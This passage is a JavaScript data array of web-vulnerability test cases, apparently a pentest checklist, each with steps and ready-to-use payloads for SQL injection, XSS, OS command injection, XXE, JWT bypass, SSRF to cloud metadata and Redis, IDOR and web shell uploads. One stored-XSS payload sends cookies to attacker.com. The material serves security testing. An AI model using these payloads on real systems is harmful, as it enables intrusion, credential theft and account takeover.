        severity: "High",
        steps: [
            "Inject prototype pollution parameters into URL query strings."
        ],
        payloads: [
            "/?__proto__[test]=polluted",
            "/?constructor[prototype][foo]=bar"
        ],
        expected: "Pollution of global JavaScript object prototypes in the browser environment."
    },
    {
        id: "fund_transfer_race_condition_h2",
        category: "Race Conditions",
        title: "Fund Transfer Race Condition via HTTP/2 Single-Packet Attack [Banking API]",
        where: "Fund Transfer API Endpoint",
        severity: "Critical",
        steps: [
            "Target balance withdrawal or fund transfer APIs using Burp Repeater."
        ],
        payloads: [
            "HTTP/2 Single-Packet TCP socket synchronization attack targeting /api/transfer"
        ],
        expected: "Duplication of funds or bypassing balance checks via concurrent execution."
    },
    {
        id: "login_sql_time_based_blind",
        category: "SQLi",
        title: "Time-Based Blind SQL Injection on Username Field [Login Page]",
        where: "Login Page Username Input",
        severity: "Critical",
        steps: [
            "Capture the login request in Burp Suite and send it to Burp Intruder.",
            "Inject time-delay SQL payloads into the username parameter."
        ],
        payloads: [
            "admin' AND (SELECT * FROM (SELECT(SLEEP(10)))a)--",
            "admin' OR IF(1=1, SLEEP(5), 0)--"
        ],
        expected: "A noticeable server response delay confirming time-based SQL injection."
    },
    {
        id: "url_param_boolean_sqli",
        category: "SQLi",
        title: "Boolean-Based Blind SQL Injection [URL Query Parameter]",
        where: "URL Query Parameter (?id=)",
        severity: "Critical",
        steps: [
            "Identify an integer query parameter in the URL (e.g., ?id=1).",
            "Send a true condition (e.g., id=1 AND 1=1) and record the response content or length."
        ],
        payloads: [
            "1' AND 1=1 --",
            "1' AND 1=2 --"
        ],
        expected: "Noticeable differences in page content or response length confirming boolean SQLi."
    },
    {
        id: "profile_bio_reflected_xss",
        category: "XSS",
        title: "Reflected XSS in Profile Preview [Profile Settings Form]",
        where: "Profile Bio Preview Page",
        severity: "Medium",
        steps: [
            "Enter HTML/JavaScript payloads into the profile bio input field and click preview."
        ],
        payloads: [
            "&lt;script&gt;alert(document.domain)&lt;/script&gt;",
            "&lt;img src=x onerror=alert(1)&gt;"
        ],
        expected: "Pop-up alert box execution proving Reflected XSS in preview mode."
    },
    {
        id: "search_bar_reflected_xss",
        category: "XSS",
        title: "Reflected Cross-Site Scripting (XSS) [Search Bar Query]",
        where: "Search Results Page",
        severity: "High",
        steps: [
            "Enter script payloads into the application search bar input field and submit."
        ],
        payloads: [
            "&lt;script&gt;alert(document.domain)&lt;/script&gt;",
            "\"&gt;&lt;script&gt;alert(1)&lt;/script&gt;"
        ],
        expected: "Pop-up alert box execution proving Reflected XSS via search parameters."
    },
    {
        id: "support_ticket_stored_xss",
        category: "XSS",
        title: "Stored Cross-Site Scripting (XSS) [Support Ticket Description]",
        where: "Support Ticket System",
        severity: "Critical",
        steps: [
            "Submit a script payload into the support ticket description field and create the ticket."
        ],
        payloads: [
            "&lt;script&gt;fetch('http://attacker.com/log?c='+document.cookie)&lt;/script&gt;",
            "&lt;svg onload=alert(document.cookie)&gt;"
        ],
        expected: "Automatic script execution when staff views the support ticket."
    },
    {
        id: "comment_section_stored_xss",
        category: "XSS",
        title: "Stored Cross-Site Scripting (XSS) [Blog Comment Section]",
        where: "Blog Post Comments",
        severity: "Critical",
        steps: [
            "Post a comment containing an HTML/JavaScript payload on a published blog article."
        ],
        payloads: [
            "&lt;script&gt;alert(document.cookie)&lt;/script&gt;",
            "&lt;img src=x onerror=alert(document.domain)&gt;"
        ],
        expected: "Automatic script execution when viewing comments on the blog post."
    },
    {
        id: "dom_xss_location_search",
        category: "XSS",
        title: "DOM-Based XSS via location.search [Client-Side JS Parameter]",
        where: "Client-Side JavaScript Source",
        severity: "High",
        steps: [
            "Inspect client-side JavaScript code for insecure usage of `location.search` or `location.href` passed to DOM sinks."
        ],
        payloads: [
            "/?name=&lt;script&gt;alert(document.domain)&lt;/script&gt;",
            "/?q=&lt;img src=x onerror=alert(1)&gt;"
        ],
        expected: "Execution of script code via client-side DOM manipulation."
    },
    {
        id: "header_injection_user_agent",
        category: "RCE & Injection",
        title: "Header Injection via User-Agent [HTTP Request Header]",
        where: "HTTP User-Agent Header",
        severity: "High",
        steps: [
            "Capture a web request in Burp Suite and modify the `User-Agent` header value."
        ],
        payloads: [
            "User-Agent: &lt;script&gt;alert(1)&lt;/script&gt;",
            "User-Agent: ' OR 1=1--"
        ],
        expected: "Unsafe reflection or execution of User-Agent header values."
    },
    {
        id: "header_injection_referer",
        category: "RCE & Injection",
        title: "Header Injection via Referer [HTTP Request Header]",
        where: "HTTP Referer Header",
        severity: "High",
        steps: [
            "Capture a request in Burp Suite and modify the `Referer` header."
        ],
        payloads: [
            "Referer: &lt;script&gt;alert(1)&lt;/script&gt;",
            "Referer: 1' UNION SELECT null--"
        ],
        expected: "Unsafe reflection or processing of HTTP Referer header values."
    },
    {
        id: "command_injection_ping_utility",
        category: "RCE & Injection",
        title: "OS Command Injection in Network Diagnostic Tool [Ping Utility Form]",
        where: "Network Diagnostic Tool",
        severity: "Critical",
        steps: [
            "Locate network utility tools (e.g., ping or traceroute forms)."
        ],
        payloads: [
            "127.0.0.1; id",
            "127.0.0.1 && cat /etc/passwd",
            "`whoami`"
        ],
        expected: "Successful execution and output of operating system commands."
    },
    {
        id: "command_injection_dns_lookup",
        category: "RCE & Injection",
        title: "OS Command Injection in DNS Lookup Utility [Lookup Tool Form]",
        where: "DNS Lookup Utility Form",
        severity: "Critical",
        steps: [
            "Locate domain lookup or nslookup input fields."
        ],
        payloads: [
            "example.com; uname -a",
            "example.com | id"
        ],
        expected: "Execution of underlying operating system commands via DNS lookup inputs."
    },
    {
        id: "xxe_svg_file_upload",
        category: "RCE & Injection",
        title: "XML External Entity (XXE) Injection via SVG File Upload [Avatar Upload]",
        where: "SVG File Upload Form",
        severity: "Critical",
        steps: [
            "Prepare a malicious SVG file containing DOCTYPE entity declarations pointing to internal files (e.g., file:///etc/passwd)."
        ],
        payloads: [
            "&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE svg [&lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt;]&gt;&lt;svg&gt;&xxe;&lt;/svg&gt;"
        ],
        expected: "Leaked internal file contents displayed in the response confirming XXE."
    },
    {
        id: "jwt_none_algorithm_bypass",
        category: "Auth & Session",
        title: "JWT 'none' Algorithm Authentication Bypass [Authorization Header]",
        where: "Authorization Header Token",
        severity: "High",
        steps: [
            "Capture a request containing a JWT token in Burp Suite.",
            "Modify the header algorithm parameter 'alg' to 'none' and strip the signature section, keeping the trailing dot."
        ],
        payloads: [
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
            "eyJhbGciOiJub25lIn0.eyJ1c2VySWQiOjF9."
        ],
        expected: "Server accepting unverified JWT tokens with 'none' algorithm."
    },
    {
        id: "jwt_weak_secret_brute",
        category: "Auth & Session",
        title: "JWT Weak HMAC Secret Brute-Forcing [Authorization Header Token]",
        where: "Authorization Header Token",
        severity: "High",
        steps: [
            "Capture a signed JWT token in Burp Suite.",
            "Export the token and use hashcat or jwt_tool to brute-force weak HMAC signing secrets against a wordlist."
        ],
        payloads: [
            "hashcat -m 16500 jwt_token.txt wordlist.txt",
            "jwt_tool.py <token> -C -d wordlist.txt"
        ],
        expected: "Successful recovery of the weak signing secret key."
    },
    {
        id: "password_reset_host_header_poison",
        category: "Auth & Session",
        title: "Password Reset Poisoning via Host Header [Password Reset Form]",
        where: "Password Reset Form",
        severity: "High",
        steps: [
            "Capture a password reset request in Burp Suite.",
            "Modify the `Host` header to point to your external domain (e.g., Host: evil.com)."
        ],
        payloads: [
            "Host: evil.com",
            "X-Forwarded-Host: evil.com"
        ],
        expected: "Password reset links generated with the poisoned domain pointing to external servers."
    },
    {
        id: "mfa_response_status_bypass",
        category: "Auth & Session",
        title: "MFA Verification Bypass via HTTP Status Code Manipulation [MFA Step]",
        where: "MFA Verification Endpoint",
        severity: "Critical",
        steps: [
            "Enter an incorrect OTP code during the MFA verification step and intercept the response in Burp Suite."
        ],
        payloads: [
            "HTTP/1.1 200 OK",
            "{\"success\": true, \"verified\": true}"
        ],
        expected: "Bypassing MFA verification flow via response status manipulation."
    },
    {
        id: "user_profile_idor_settings",
        category: "IDOR & Access",
        title: "Insecure Direct Object Reference in User Profile Settings [Settings Form]",
        where: "User Profile Settings API",
        severity: "Critical",
        steps: [
            "Log into your account and navigate to profile settings."
        ],
        payloads: [
            "user_id=101 to user_id=102",
            "account_id=54 to account_id=55"
        ],
        expected: "Unauthorized modification of private profile settings belonging to other users."
    },
    {
        id: "rest_api_bola_orders",
        category: "IDOR & Access",
        title: "Broken Object Level Authorization on Order History [REST API Endpoint]",
        where: "REST API Orders Endpoint",
        severity: "Critical",
        steps: [
            "Log into the application and capture an API request fetching order records (e.g., /api/v1/orders/1001)."
        ],
        payloads: [
            "/api/v1/orders/1001 to /api/v1/orders/1002",
            "/api/v1/invoices/50"
        ],
        expected: "Unauthorized access and disclosure of other users' order records."
    },
    {
        id: "admin_url_direct_browse",
        category: "IDOR & Access",
        title: "Function Level Access Control Bypass via Direct URL Browsing [Admin Panel]",
        where: "Admin Panel URL Routes",
        severity: "High",
        steps: [
            "Log into the application using a standard low-privilege customer account."
        ],
        payloads: [
            "/admin/dashboard",
            "/admin/users/manage"
        ],
        expected: "Unrestricted access and viewing of administrative panel pages."
    },
    {
        id: "webhook_ssrf_avatar",
        category: "SSRF",
        title: "Server-Side Request Forgery via Avatar URL Fetcher [Profile Image Fetcher]",
        where: "Avatar URL Import Form",
        severity: "Critical",
        steps: [
            "Locate avatar import functionality that fetches profile pictures from external URLs."
        ],
        payloads: [
            "http://127.0.0.1:80/",
            "http://169.254.169.254/latest/meta-data/"
        ],
        expected: "Exposing internal ports or metadata via avatar URL fetcher."
    },
    {
        id: "avatar_upload_webshell_rce",
        category: "File Upload",
        title: "Unrestricted File Upload to RCE via Avatar Form [Avatar Upload]",
        where: "Avatar Upload Portal",
        severity: "Critical",
        steps: [
            "Attempt uploading an executable PHP or ASPX web script disguised as an image file through the avatar upload form."
        ],
        payloads: [
            "shell.php",
            "shell.jpg.php"
        ],
        expected: "Successful remote code execution via uploaded web shell files."
    },
    {
        id: "path_traversal_document_upload",
        category: "File Upload",
        title: "Path Traversal via Document Upload Filename [Document Portal]",
        where: "Document Management Upload",
        severity: "High",
        steps: [
            "Capture a document upload request in Burp Suite."
        ],
        payloads: [
            "../../../var/www/html/exploit.php",
            "..\\..\\..\\inetpub\\wwwroot\\exploit.aspx"
        ],
        expected: "Writing files outside intended upload folders."
    },
    {
        id: "ecommerce_cart_price_manipulation",
        category: "Business Logic",
        title: "Price Manipulation via Cart Request Parameter [E-Commerce Checkout]",
        where: "E-Commerce Cart Checkout",
        severity: "High",
        steps: [
            "Add items to the cart and capture the checkout request in Burp Suite."
        ],
        payloads: [
            "price=0.01",
            "quantity=-1"
        ],
        expected: "Successful order placement with altered prices or negative total amounts."
    },
    {
        id: "promo_code_race_condition",
        category: "Business Logic",
        title: "Race Condition in Promo Code Redemption [Promo Code Page]",
        where: "Promo Code Redemption API",
        severity: "High",
        steps: [
            "Send a single-use promo code redemption request to Burp Repeater."
        ],
        payloads: [
            "Parallel HTTP/1.1 requests pipeline test via Turbo Intruder"
        ],
        expected: "Multiple successful redemptions from a single-use action."
    },
    {
        id: "git_repo_exposure_webroot",
        category: "Information Disclosure",
        title: "Git Repository Exposure (.git folder) [Web Root Path]",
        where: "Web Root Directory",
        severity: "High",
        steps: [
            "Append sensitive repository paths to the target domain URL in the browser (e.g., /.git/HEAD)."
        ],
        payloads: [
            "/.git/HEAD",
            "/.git/config",
            "/.env"
        ],
        expected: "Downloading source code configurations or repository logs."
    },
    {
        id: "clickjacking_missing_x_frame",
        category: "Clickjacking",
        title: "Clickjacking via Missing X-Frame-Options Header [Portal Pages]",
        where: "Main Application Pages",
        severity: "Medium",
        steps: [
            "Check HTTP response headers of main portal pages for framing security controls (`X-Frame-Options` or `Content-Security-Policy`)."
        ],
        payloads: [
            "&lt;iframe src=\"https://target.com\" style=\"opacity:0.0;\"&gt;&lt;/iframe&gt;"
        ],
        expected: "Successful embedding of the application inside an external iframe."
    },
    {
        id: "websocket_cswsh_exploit",
        category: "WebSockets",
        title: "Cross-Site WebSocket Hijacking (CSWSH) [WebSocket Endpoint]",
        where: "WebSocket Handshake Endpoint",
        severity: "High",
        steps: [
            "Inspect WebSocket handshake requests to check if they validate the `Origin` header and lack anti-CSRF protection."
        ],
        payloads: [
            "&lt;script&gt;var ws = new WebSocket('wss://target.com/ws'); ws.onopen = function() { ws.send('data'); };&lt;/script&gt;"
        ],
        expected: "Unauthenticated WebSocket connection establishment from external origins."
    },
    {
        id: "cors_permissive_origin_credentials",
        category: "CORS Misconfiguration",
        title: "Overly Permissive CORS Policy with Credentials [API Headers]",
        where: "API Endpoints",
        severity: "High",
        steps: [
            "Send an API request containing a custom `Origin` header (e.g., Origin: https://evil.com) in Burp Repeater."
        ],
        payloads: [
            "Origin: https://evil.com",
            "Origin: null"
        ],
        expected: "Reflection of untrusted origins alongside credentials permitting cross-origin data theft."
    },
    {
        id: "idor_invoice_download_pdf",
        category: "IDOR & Access",
        title: "BOLA / IDOR in PDF Invoice Download [Invoice Endpoint]",
        where: "Invoice Download API",
        severity: "Critical",
        steps: [
            "Capture the PDF invoice download request in Burp Suite."
        ],
        payloads: [
            "/api/v1/invoices/2045",
            "/download?invoice_id=9981"
        ],
        expected: "Unauthorized access and download of private customer invoices."
    },
    {
        id: "idor_user_email_update",
        category: "IDOR & Access",
        title: "IDOR in Account Email Modification API [Profile Settings]",
        where: "Profile Settings Endpoint",
        severity: "Critical",
        steps: [
            "Capture the request when updating your account email address."
        ],
        payloads: [
            "{\\\"user_id\\\": 45, \\\"email\\\": \\\"attacker@evil.com\\\"}",
            "account_id=12&new_email=hacked@evil.com"
        ],
        expected: "Unauthorized account takeover via email address overwriting."
    },
    {
        id: "idor_support_ticket_view",
        category: "IDOR & Access",
        title: "IDOR in Support Ticket Viewing API [Helpdesk System]",
        where: "Helpdesk Ticket Endpoint",
        severity: "Medium",
        steps: [
            "Capture a support ticket retrieval request in Burp Suite."
        ],
        payloads: [
            "/api/tickets/1005",
            "/support/view?id=8823"
        ],
        expected: "Exposure of private support communications and sensitive user data."
    },
    {
        id: "idor_user_avatar_delete",
        category: "IDOR & Access",
        title: "IDOR in User Profile Avatar Deletion [Avatar Management API]",
        where: "Avatar Delete Endpoint",
        severity: "Medium",
        steps: [
            "Capture the request sent when deleting your profile picture."
        ],
        payloads: [
            "DELETE /api/user/avatar?id=102",
            "POST /settings/avatar/remove with target_user=56"
        ],
        expected: "Unauthorized deletion of files or assets belonging to other users."
    },
    {
        id: "idor_favorite_item_add",
        category: "IDOR & Access",
        title: "IDOR / BOLA in Wishlist Item Management [Wishlist API]",
        where: "Wishlist API Endpoint",
        severity: "Low",
        steps: [
            "Capture the request adding an item to your personal wishlist."
        ],
        payloads: [
            "POST /api/wishlist/add with user_id=44",
            "PUT /api/lists/99/items"
        ],
        expected: "Unauthorized modification of other users' saved wishlist collections."
    },
    {
        id: "idor_subscription_plan_view",
        category: "IDOR & Access",
        title: "IDOR in Subscription Details Lookup [Billing API]",
        where: "Billing Management API",
        severity: "Medium",
        steps: [
            "Capture the billing subscription status request."
        ],
        payloads: [
            "/api/billing/subscription?user_id=12",
            "/api/v1/account/plan/33"
        ],
        expected: "Disclosure of confidential subscription and billing information."
    },
    {
        id: "idor_notification_settings_update",
        category: "IDOR & Access",
        title: "IDOR in Notification Preferences Update [Settings API]",
        where: "Notification Settings API",
        severity: "Low",
        steps: [
            "Capture the notification preferences update request."
        ],
        payloads: [
            "PUT /api/notifications/settings with user_id=89",
            "POST /settings/alerts?uid=124"
        ],
        expected: "Unauthorized alteration of notification configurations for other users."
    },
    {
        id: "idor_api_key_retrieval",
        category: "IDOR & Access",
        title: "IDOR for API Key / Access Token Retrieval [Developer Portal API]",
        where: "Developer Portal Endpoint",
        severity: "Critical",
        steps: [
            "Capture the API key retrieval request in the developer settings dashboard."
        ],
        payloads: [
            "/api/developer/keys?user_id=5",
            "/api/v1/tokens/retrieve?id=42"
        ],
        expected: "Exposure of secret API tokens and developer credentials."
    },
    {
        id: "idor_transaction_history_export",
        category: "IDOR & Access",
        title: "IDOR in Financial Transaction History Export [Transaction API]",
        where: "Transaction History API",
        severity: "High",
        steps: [
            "Capture the transaction history export request in Burp Suite."
        ],
        payloads: [
            "/api/transactions/export?user_id=11",
            "/export/csv?account_id=902"
        ],
        expected: "Unauthorized downloading of financial transaction reports."
    },
    {
        id: "idor_chat_message_history",
        category: "IDOR & Access",
        title: "IDOR in Private Chat Message Retrieval [Messaging API]",
        where: "Chat History Endpoint",
        severity: "High",
        steps: [
            "Capture an API request fetching messages from a specific chat room or thread."
        ],
        payloads: [
            "/api/chat/messages?thread_id=502",
            "/messages/get?room=104"
        ],
        expected: "Unauthorized access and reading of private chat communications."
    },
    {
        id: "idor_team_member_remove",
        category: "IDOR & Access",
        title: "IDOR in Team Workspace Member Removal [Workspace Management API]",
        where: "Workspace API Endpoint",
        severity: "High",
        steps: [
            "Capture the request removing a member from your team workspace."
        ],
        payloads: [
            "DELETE /api/workspace/5/members/12",
            "POST /teams/remove with workspace_id=99&user_id=1"
        ],
        expected: "Unauthorized removal of users from external organization workspaces."
    },
    {
        id: "idor_comment_edit_delete",
        category: "IDOR & Access",
        title: "IDOR / BOLA in Comment Modification [Comment Management API]",
        where: "Comment Management Endpoint",
        severity: "Medium",
        steps: [
            "Capture the request editing or deleting your own comment."
        ],
        payloads: [
            "PUT /api/comments/451 with updated text",
            "DELETE /api/comments/892"
        ],
        expected: "Unauthorized modification or deletion of other users' comments."
    },
    {
        id: "idor_project_file_upload",
        category: "IDOR & Access",
        title: "IDOR in Project File Attachment [Project Management API]",
        where: "Project Upload Endpoint",
        severity: "High",
        steps: [
            "Capture the file upload request inside a project workspace."
        ],
        payloads: [
            "POST /api/projects/10/files with file data",
            "/upload?project_id=45"
        ],
        expected: "Unauthorized file uploads into foreign project repositories."
    },
    {
        id: "idor_coupon_code_delete",
        category: "IDOR & Access",
        title: "IDOR in Admin Coupon Management [Admin Promotion API]",
        where: "Admin Coupon Endpoint",
        severity: "High",
        steps: [
            "Log in as a standard user and capture any parameter interaction."
        ],
        payloads: [
            "DELETE /api/admin/coupons/12",
            "PUT /api/admin/promos/5 with active=false"
        ],
        expected: "Unauthorized manipulation of system promotional codes by unauthorized users."
    },
    {
        id: "idor_user_session_revoke",
        category: "IDOR & Access",
        title: "IDOR in Active User Session Revocation [Security Settings API]",
        where: "Session Management Endpoint",
        severity: "High",
        steps: [
            "Capture the request revoking an active browser login session."
        ],
        payloads: [
            "POST /api/sessions/revoke with session_uuid=XYZ",
            "/auth/logout-other?user_id=14"
        ],
        expected: "Forced termination of active sessions belonging to other users."
    },
    {
        id: "idor_shipping_label_download",
        category: "IDOR & Access",
        title: "IDOR in E-Commerce Shipping Label Generation [Shipping API]",
        where: "Shipping Label Endpoint",
        severity: "High",
        steps: [
            "Capture the shipping label PDF generation request."
        ],
        payloads: [
            "/api/shipping/label?order_id=5001",
            "/label/download?shipment_uuid=abc-123"
        ],
        expected: "Exposure of customer shipping details and delivery labels."
    },
    {
        id: "idor_survey_response_view",
        category: "IDOR & Access",
        title: "IDOR in Survey Response Results Retrieval [Survey Platform API]",
        where: "Survey Results Endpoint",
        severity: "Medium",
        steps: [
            "Capture the request fetching your survey submission responses."
        ],
        payloads: [
            "/api/surveys/10/responses?id=402",
            "/survey/results?submission_id=89"
        ],
        expected: "Unauthorized access to private survey submission results."
    },
    {
        id: "idor_task_assignment_modify",
        category: "IDOR & Access",
        title: "IDOR in Task Assignment & Status Update [Task Manager API]",
        where: "Task Management Endpoint",
        severity: "Medium",
        steps: [
            "Capture the request updating the status of an assigned task."
        ],
        payloads: [
            "PUT /api/tasks/302 with status=completed",
            "POST /tasks/update?task_id=109"
        ],
        expected: "Unauthorized modification of tasks belonging to other users."
    },
    {
        id: "idor_medical_record_view",
        category: "IDOR & Access",
        title: "IDOR in Patient Medical Record Access [Healthcare Portal API]",
        where: "Medical Records Endpoint",
        severity: "Critical",
        steps: [
            "Log into the patient health portal and capture a medical record lookup request."
        ],
        payloads: [
            "/api/health/records?patient_id=1002",
            "/medical/files/download?record_id=451"
        ],
        expected: "Severe disclosure of confidential patient medical records and health PII."
    },
    {
        id: "idor_bank_account_delete",
        category: "IDOR & Access",
        title: "IDOR in Linked Bank Account Removal [Fintech Payment API]",
        where: "Bank Account API Endpoint",
        severity: "Critical",
        steps: [
            "Capture the request removing a linked bank account or credit card from your profile."
        ],
        payloads: [
            "DELETE /api/wallet/bank-accounts/55",
            "POST /accounts/unlink?account_id=102"
        ],
        expected: "Unauthorized removal of linked financial accounts from other users' profiles."
    },
    {
        id: "ssrf_webhook_internal_scan",
        category: "SSRF",
        title: "SSRF via Webhook Configuration Endpoint [Webhook Creator]",
        where: "Webhook Setup Form",
        severity: "Critical",
        steps: [
            "Locate webhook configuration forms that allow testing or saving target callback URLs."
        ],
        payloads: [
            "http://127.0.0.1:22/",
            "http://localhost:6379/",
            "http://169.254.169.254/latest/meta-data/"
        ],
        expected: "Scanning internal network ports and querying internal infrastructure services via webhooks."
    },
    {
        id: "ssrf_rss_feed_fetcher",
        category: "SSRF",
        title: "SSRF via RSS Feed Aggregator Import [Feed Importer]",
        where: "RSS Import Form",
        severity: "High",
        steps: [
            "Locate RSS feed import features that fetch external XML contents via URL."
        ],
        payloads: [
            "http://127.0.0.1/server-status",
            "file:///etc/hosts"
        ],
        expected: "Exposing internal files or server configurations through RSS feed parsing."
    },
    {
        id: "ssrf_image_proxy_download",
        category: "SSRF",
        title: "SSRF via Image Proxy / Resizer Utility [Image Fetcher API]",
        where: "Image Proxy Endpoint",
        severity: "High",
        steps: [
            "Identify image proxy endpoints that accept image URLs as parameters (e.g., /proxy?url=)."
        ],
        payloads: [
            "/proxy?url=http://169.254.169.254/latest/meta-data/hostname",
            "/image-resize?src=http://127.0.0.1:3000/"
        ],
        expected: "Accessing internal network endpoints and metadata via image proxy utilities."
    },
    {
        id: "ssrf_pdf_generator_ssrf",
        category: "SSRF",
        title: "SSRF & Internal Resource Loading via PDF Generator [Invoice PDF Tool]",
        where: "PDF Export Feature",
        severity: "Critical",
        steps: [
            "Inject external or internal URL references inside HTML elements rendered into PDF documents."
        ],
        payloads: [
            "&lt;img src=&quot;http://127.0.0.1:8080/internal-dashboard&quot;&gt;",
            "&lt;link rel=&quot;stylesheet&quot; href=&quot;http://169.254.169.254/latest/meta-data/&quot;&gt;"
        ],
        expected: "Loading internal network pages and capturing outputs inside generated PDF files."
    },
    {
        id: "ssrf_oauth_discovery_ssrf",
        category: "SSRF",
        title: "SSRF via OpenID / OAuth Provider Metadata Discovery [SSO Configuration]",
        where: "OAuth Discovery Form",
        severity: "High",
        steps: [
            "Locate custom OpenID Connect configuration discovery inputs where users provide provider endpoints."
        ],
        payloads: [
            "http://127.0.0.1:5000/.well-known/openid-configuration",
            "http://169.254.169.254/latest/"
        ],
        expected: "Unvalidated outbound requests to internal endpoints via SSO configuration fetchers."
    },
    {
        id: "ssrf_file_import_url",
        category: "SSRF",
        title: "SSRF via Remote File Import from URL [Document Upload Portal]",
        where: "File Import URL Form",
        severity: "High",
        steps: [
            "Locate file import features that allow downloading documents from external URLs."
        ],
        payloads: [
            "http://127.0.0.1/config.json",
            "http://169.254.169.254/latest/dynamic/instance-identity/document"
        ],
        expected: "Importing sensitive internal files into user storage via URL fetchers."
    },
    {
        id: "ssrf_social_preview_fetcher",
        category: "SSRF",
        title: "SSRF via Social Media Link Preview Generator [Link Preview API]",
        where: "Link Preview Endpoint",
        severity: "High",
        steps: [
            "Locate link preview features that generate metadata cards from submitted URLs."
        ],
        payloads: [
            "http://127.0.0.1:9200/_cat/indices",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
        ],
        expected: "Exposing internal service indices and metadata via link preview generators."
    },
    {
        id: "ssrf_smtp_gateway_injection",
        category: "SSRF",
        title: "SSRF / SMTP Injection via Notification Server [Notification Gateway]",
        where: "Notification Settings",
        severity: "Medium",
        steps: [
            "Locate custom webhook or notification dispatch configurations."
        ],
        payloads: [
            "smtp://127.0.0.1:25",
            "gopher://127.0.0.1:3306/_"
        ],
        expected: "Interacting with internal mail servers and backend ports via notification configurations."
    },
    {
        id: "ssrf_dns_lookup_utility",
        category: "SSRF",
        title: "SSRF via Network Diagnostic DNS Lookup Tool [Diagnostic Tool]",
        where: "DNS Lookup Form",
        severity: "Medium",
        steps: [
            "Locate domain diagnostic lookup tools in application management panels."
        ],
        payloads: [
            "localhost",
            "internal.corp.local",
            "127.0.0.1"
        ],
        expected: "Resolving internal corporate hostnames and network topology via diagnostic tools."
    },
    {
        id: "ssrf_gopher_redis_rce",
        category: "SSRF",
        title: "Advanced SSRF to RCE via Gopher Protocol and Redis [Internal Service Access]",
        where: "URL Fetcher Endpoint",
        severity: "Critical",
        steps: [
            "Identify an SSRF vulnerability where arbitrary URL schemes (like gopher://) are supported by the backend fetcher."
        ],
        payloads: [
            "gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A...",
            "gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html/"
        ],
        expected: "Achieving remote code execution on internal Redis database instances via Gopher SSRF."
    },
    {
        id: "sqli_union_search_parameter",
        category: "SQLi",
        title: "UNION-Based SQL Injection on Search Parameter [Search Query Input]",
        where: "Search Query Input",
        severity: "Critical",
        steps: [
            "Capture a search query request in Burp Suite and send it to Burp Repeater."
        ],
        payloads: [
            "' UNION SELECT null, null, @@version--",
            "' UNION SELECT table_name, null, null FROM information_schema.tables--"
        ],
        expected: "Extracting database metadata and table names via UNION-based SQL injection."
    },
    {
        id: "sqli_error_based_numeric",
        category: "SQLi",
        title: "Error-Based SQL Injection on Numeric ID [URL Parameter ID]",
        where: "URL Query Parameter ID",
        severity: "Critical",
        steps: [
            "Locate numeric ID parameters in application URLs (e.g., ?id=1)."
        ],
        payloads: [
            "1' AND extractvalue(1, concat(0x7e, @@version))--",
            "1' AND updatexml(1, concat(0x7e, user()), 1)--"
        ],
        expected: "Leaking internal database version and user info through explicit SQL error messages."
    },
    {
        id: "sqli_order_by_numeric",
        category: "SQLi",
        title: "SQL Injection in ORDER BY Clause [Sorting Parameter]",
        where: "Sorting Parameter",
        severity: "High",
        steps: [
            "Identify sorting parameters in table views (e.g., ?sort=column_name)."
        ],
        payloads: [
            "column_name ASC, (IF(1=1, SLEEP(5), 0))",
            "1, (SELECT * FROM (SELECT(SLEEP(5)))a)"
        ],
        expected: "Time delays or error indicators confirming SQL injection in ORDER BY clauses."
    },
    {
        id: "sqli_json_body_parameter",
        category: "SQLi",
        title: "SQL Injection in JSON Body Parameter [API POST Endpoint]",
        where: "API JSON Request Body",
        severity: "Critical",
        steps: [
            "Capture an API POST request containing JSON data fields in Burp Suite."
        ],
        payloads: [
            "{\\\"username\\\": \\\"admin' OR '1'='1\\\", \\\"password\\\": \\\"test\\\"}",
            "{\\\"filter\\\": \\\"1' UNION SELECT database()--\\\"}"
        ],
        expected: "Authentication bypass or data extraction via JSON body SQL injection."
    },
    {
        id: "sqli_cookie_header_injection",
        category: "SQLi",
        title: "SQL Injection in Cookie Header [Tracking Cookie Parameter]",
        where: "Cookie Header Value",
        severity: "Critical",
        steps: [
            "Capture web requests in Burp Suite and locate tracking cookies (e.g., tracking_id=XYZ)."
        ],
        payloads: [
            "Cookie: tracking_id=1' UNION SELECT @@version--",
            "Cookie: session_token=1' AND SLEEP(5)--"
        ],
        expected: "Database error disclosure or delay confirming SQL injection via HTTP cookies."
    },
    {
        id: "sqli_second_order_registration",
        category: "SQLi",
        title: "Second-Order SQL Injection via User Profile Name [Profile Update API]",
        where: "User Registration / Profile Form",
        severity: "Critical",
        steps: [
            "Register an account with a name containing SQL payloads (e.g., admin'--)."
        ],
        payloads: [
            "admin'--', 'password')",
            "test_user' UNION SELECT password FROM users--"
        ],
        expected: "Executing unsanitized stored user input in secondary backend SQL queries."
    },
    {
        id: "sqli_stacked_queries_postgresql",
        category: "SQLi",
        title: "Stacked Queries SQL Injection in PostgreSQL [API ID Parameter]",
        where: "API Numeric Parameter",
        severity: "Critical",
        steps: [
            "Identify PostgreSQL backend applications through banner analysis or error messages."
        ],
        payloads: [
            "1; UPDATE users SET role='admin' WHERE id=5--",
            "1; SELECT pg_sleep(10)--"
        ],
        expected: "Executing multiple sequential SQL statements in PostgreSQL databases."
    },
    {
        id: "sqli_xml_soap_parameter",
        category: "SQLi",
        title: "SQL Injection in SOAP / XML API Request [SOAP Endpoint]",
        where: "SOAP XML Request Body",
        severity: "Critical",
        steps: [
            "Capture a SOAP XML request in Burp Suite."
        ],
        payloads: [
            "&lt;username&gt;admin' OR '1'='1&lt;/username&gt;",
            "&lt;userId&gt;1' UNION SELECT @@version--&lt;/userId&gt;"
        ],
        expected: "Extracting data or bypassing logic via XML parameter SQL injection."
    },
    {
        id: "sqli_oauth_state_parameter",
        category: "SQLi",
        title: "SQL Injection in OAuth State Parameter [OAuth Callback]",
        where: "OAuth State Parameter",
        severity: "High",
        steps: [
            "Capture the OAuth authorization redirect containing the `state` parameter."
        ],
        payloads: [
            "state=xyz' OR '1'='1",
            "state=abc' UNION SELECT null, user()--"
        ],
        expected: "Database error leakage during OAuth state parameter processing."
    },
    {
        id: "sqli_mass_assignment_filter",
        category: "SQLi",
        title: "SQL Injection in Product Filter / Pagination API [Catalog API]",
        where: "Catalog API Parameters",
        severity: "High",
        steps: [
            "Capture API requests filtering products by category or price range."
        ],
